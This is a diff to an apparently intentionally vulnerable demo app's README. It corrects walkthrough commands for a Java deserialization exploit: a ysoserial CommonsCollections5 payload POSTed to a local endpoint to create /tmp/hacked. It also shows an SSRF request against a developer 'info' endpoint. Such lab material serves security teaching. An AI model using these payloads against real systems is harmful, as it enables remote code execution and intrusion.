@@ -95,12 +95,12 @@ To exploit this, we must first make an exploit that creates a file in `/tmp` as 
 $ git clone https://github.com/frohoff/ysoserial
 $ cd ysoserial
 $ docker build -t ysoserial .
-$ docker run --rm -t ysoserial CommonsCollections5 'touch /tmp/hacked' > commonscollections5.ser
+$ docker run --rm ysoserial CommonsCollections5 '/usr/bin/touch /tmp/hacked' > commonscollections5.ser
 ```
 
 Now you can send the exploit generated in the `commonscollections5.ser` file:
 ```
-$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary @commonscollections5.ser http://localhost:8001/update
+$ curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@commonscollections5.ser" http://localhost:8001/update
 ```
 
 To prove that we created this `/tmp/hacked` file, we must shell into the running container. 
@@ -116,13 +116,13 @@ CONTAINER ID        IMAGE                    COMMAND                 CREATED    
 
 Now, using that container ID, we shell into the container and confirm the exploit created the `/tmp/hacked` file:
 ```
-$ docker exec -it java-microservice-sample-apps_bookstore-datamanager_1 ls -al /tmp
+$ docker exec -it java-microservice-sample-apps_bookstore-datamanager_1 ls -al /tmp/hacked
 ...
-*/tmp/hacked*
+-rw-r--r-- 1 root root 0 <time> /tmp/hacked
 ```
 
-### Same-Site Request Forgery (SSRF)
-The `bookstore-frontend` exposes a "info" service, only intended for developers. It is intended to be used to rertieve data about diffferent developer environments, but it can be used to force the app to retrieve data from other URLs:
+### Server Side Request Forgery (SSRF)
+The `bookstore-frontend` exposes a "info" service, only intended for developers. It is intended to be used to rertieve data about different developer environments, but it can be used to force the app to retrieve data from other URLs:
 ```
 $ curl http://localhost:8002/application/info?env=google.com/?
 ```
